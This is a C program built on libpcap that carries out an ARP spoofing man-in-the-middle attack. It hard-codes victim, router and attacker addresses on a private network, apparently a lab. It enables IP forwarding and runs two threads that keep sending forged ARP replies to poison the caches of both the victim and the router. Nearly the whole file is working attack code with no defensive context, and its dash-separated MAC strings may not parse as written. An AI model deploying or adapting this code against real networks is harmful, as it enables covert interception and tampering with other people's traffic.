#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <unistd.h>

#define VICTIM_IP "192.168.106.185"
#define VICTIM_MAC "5c-fb-3a-cc-b5-a7"

#define ROUTER_IP "192.168.106.144"
#define ROUTER_MAC "8e-e8-bf-6f-37-20"

#define ATTACKER_IP "192.168.106.205"
#define ATTACKER_MAC "08-00-27-1e-36-4a"

#define INTERVAL 2

#define BROADCAST "ff:ff:ff:ff:ff:ff"

char victim_mac_str[200];
struct ether_addr victim_mac_global;

char router_mac_str[200];
struct ether_addr router_mac_global;

struct arp_packet_data 
{
    const char *target_ip;  // IP address of the target
    int is_victim;         // victim=1 or router=0
};

pcap_t *connection_handler;

void setIPForwarding(int toggle) 
{
    if (toggle) {
        printf("~~~Turning on IP forwarding...\n");
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    }
    if (!toggle) {
        printf("~~~Turning off IP forwarding...\n");
        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    }
}

void sendARP(pcap_t *connection_handler, const char *target_ip, const char *target_mac, const char *spoof_ip)
{
    struct ether_header eth_header;
    struct ether_arp arp_packet;

    // ETHERNET FRAME HEADER
    memset(&eth_header, 0, sizeof(struct ether_header));
    // ether_aton_r() function is used to convert string representation of a MAC address to its binary form
    // htons = host to network short
    ether_aton_r(BROADCAST, (struct ether_addr *)&eth_header.ether_dhost); // Destination MAC address field
    ether_aton_r(ATTACKER_MAC, (struct ether_addr *)&eth_header.ether_shost); // Source MAC address field
    eth_header.ether_type = htons(ETHERTYPE_ARP); // Protocol type of the payload data

    // ARP REPLY PACKET
    arp_packet.arp_hrd = htons(ARPHRD_ETHER); // Hardware Type
    arp_packet.arp_pro = htons(ETHERTYPE_IP); // Protcol type
    arp_packet.arp_hln = 6; // Hardware address length (MAC address)
    arp_packet.arp_pln = 4; // Protocol address length (IPv4 address)
    arp_packet.arp_op = htons(ARPOP_REPLY); // Type of ARP message

    ether_aton_r(ATTACKER_MAC, (struct ether_addr *)&arp_packet.arp_sha); // Source MAC address in the ARP Packet
    // inet_pton() is used to convert an IPv4 address from its text representation to binary form.
    inet_pton(AF_INET, spoof_ip, &arp_packet.arp_spa); //  Source IP address in the ARP packet
    ether_aton_r(target_mac, (struct ether_addr *)&arp_packet.arp_tha); // Destination MAC address in the ARP Packet
    inet_pton(AF_INET, target_ip, &arp_packet.arp_tpa); // Destination IP address in the ARP packet

    // BUFFER TO HOLD THE COMPLETE PACKET
    uint8_t packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    memcpy(packet, &eth_header, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), &arp_packet, sizeof(struct ether_arp));

    // SENDING ARP REPLY PACKETS
    if (pcap_sendpacket(connection_handler, packet, sizeof(packet)) != 0)
    {
        fprintf(stderr, "Error sending ARP reply: %s\n", pcap_geterr(connection_handler));
        exit(1);
    }
}

void *sendARPPackets(void *args)
{
    struct arp_packet_data *data = (struct arp_packet_data *)args;
    const char *target_ip = data->target_ip;
    const int is_victim = data->is_victim;

    const char *mac_str_temp = is_victim ? ether_ntoa(&victim_mac_global) : ether_ntoa(&router_mac_global);
    char mac_str[200];
    strcpy(mac_str, mac_str_temp);

    while (1)
    {
        sendARP(connection_handler, target_ip, mac_str, is_victim ?  ROUTER_IP : VICTIM_IP );
        printf("Sending ARP to %s:%s\n", is_victim ? "Victim" : "Router",is_victim ? VICTIM_IP : ROUTER_IP);
        sleep(INTERVAL);
    }

    return NULL;
}

int main()
{

    setIPForwarding(1);

    char errbuf[PCAP_ERRBUF_SIZE];
    const char *dev = "eth0"; // Network Interface Name

    // Network Interface for packet capture
    connection_handler = pcap_open_live(dev, 65535, 1, 1000, errbuf);
    if (connection_handler == NULL)
    {
        fprintf(stderr, "Error opening network interface: %s\n", errbuf);
        return 1;
    }

    // Define struct arp_packet_data for victim and router
    ether_aton_r(VICTIM_MAC, &victim_mac_global);
    struct arp_packet_data victim_data;
    victim_data.target_ip = VICTIM_IP;
    victim_data.is_victim = 1;

    ether_aton_r(ROUTER_MAC, &router_mac_global);
    struct arp_packet_data router_data;
    router_data.target_ip = ROUTER_IP;
    router_data.is_victim = 0;

    pthread_t arp_thread1, arp_thread2;

    // Starting ARP spoofing threads for victim and router
    pthread_create(&arp_thread1, NULL, sendARPPackets, (void *)&victim_data);
    pthread_create(&arp_thread2, NULL, sendARPPackets, (void *)&router_data);

    pthread_join(arp_thread1, NULL);
    pthread_join(arp_thread2, NULL);
    //pthread_join(mediation_thread, NULL);

    pcap_close(connection_handler);
    return 0;
}
